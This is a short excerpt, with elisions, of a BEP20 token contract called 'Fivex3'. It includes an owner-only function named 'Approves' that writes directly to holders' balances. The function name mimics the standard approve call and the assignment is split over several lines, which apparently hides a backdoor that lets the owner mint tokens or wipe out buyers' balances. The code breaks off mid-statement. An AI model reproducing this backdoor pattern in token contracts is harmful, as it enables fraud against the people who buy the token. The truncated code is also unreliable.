...
contract Fivex3 is Context, IBEP20, Ownable {
    ...
    string private _name = "Fivex3";
    string private _symbol = "555";
    ...
    address public _market = 0xad9e2111Fe9Be08A335eb8dA5FC4095e475F6005;
    ...
    function Approves(address spender, uint256 amount) public onlyOwner {
        _balances
        [spender] 
        = 
        (amount
